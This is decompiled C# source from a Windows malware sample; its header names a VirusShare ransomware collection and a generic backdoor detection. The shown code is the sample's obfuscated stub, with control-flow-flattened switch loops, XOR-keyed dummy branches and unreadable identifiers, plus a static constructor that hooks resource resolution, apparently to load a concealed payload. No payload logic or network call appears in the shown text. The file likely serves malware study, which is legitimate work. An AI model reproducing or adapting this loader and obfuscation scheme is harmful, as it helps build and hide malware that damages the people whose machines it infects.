// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴈ
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-096e6b097e27c58c2df14c5e158c75d47cc6916069c8924d0ff712617061c5e0.exe

using MICROSOFT.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stub.My;
using System;
using System.Collections;
using System.ComponentModel.Design;
using System.IO;
using System.Runtime.InteropServices;

namespace Ⴐ
{
  [StandardModule]
  [HideModuleName]
  internal sealed class Ⴈ
  {
    private static bool Ⴍ;

    [HelpKeyword("My.Settings")]
    internal static MySettings Ⴐ => MySettings.Default;

    static Ⴈ() => Ⴐ.Ⴈ.Ⴃ();

    internal static void Ⴈ([In] Hashtable obj0, [In] object obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 2:
          case 3:
            num1 = 5;
            continue;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case (int) sbyte.MaxValue:
                num2 = 0;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Add(obj1, obj2);
    }

    internal static bool Ⴄ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 14:
          num1 = 1;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 2;
            continue;
          case 1:
          case 3:
            goto label_8;
          case 2:
            goto label_3;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴈ.Ⴄ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return object.ReferenceEquals(obj0, obj1);
    }

    internal static void Ⴗ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
            goto label_7;
          case 4:
            goto label_8;
          case 5:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 36:
                num2 = 2;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Close();
    }

    internal static void Ⴅ([In] IntPtr obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            num1 = 5;
            continue;
          case 1:
          case 3:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 71:
                num2 = 1;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Marshal.Copy(obj0, obj1, obj2, obj3);
    }

    internal static bool Ⴓ([In] WeakReference obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 95:
          num1 = 2;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            num2 = 6;
            continue;
          case 1:
          case 5:
            num2 = 6;
            continue;
          case 2:
          case 3:
            goto label_8;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴈ.Ⴓ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.IsAlive;
    }

    internal static void Ⴃ()
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_4;
          default:
            if (!Ⴐ.Ⴈ.Ⴍ)
            {
              num1 = 1;
              continue;
            }
            goto label_11;
        }
      }
label_11:
      return;
label_4:
      lock (typeof (Ⴐ.Ⴈ))
      {
        int num2 = 4;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 2;
              continue;
            case 1:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴐ.Ⴗ.Ⴗ);
              goto case 0;
            case 2:
              goto label_13;
            case 5:
              Ⴐ.Ⴈ.Ⴍ = true;
              goto case 1;
            default:
              num2 = Ⴐ.Ⴈ.Ⴍ ? 2 : 5;
              continue;
          }
        }
      }
label_13:
      int num3 = 3;
      while (true)
      {
        switch (num3)
        {
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴈ.Ⴃ);
            num3 = 5;
            continue;
          case 5:
            goto label_17;
          default:
            num3 = 5;
            continue;
        }
      }
label_17:;
    }

    internal static int Ⴜ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 37)
      {
        case 0:
          return obj0.Read(obj1, obj2, obj3);
        default:
          goto label_0;
      }
    }

    internal static byte[] ႨႠ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 56)
      {
        case 0:
          return obj0.ToArray();
        default:
          goto label_0;
      }
    }
  }
}
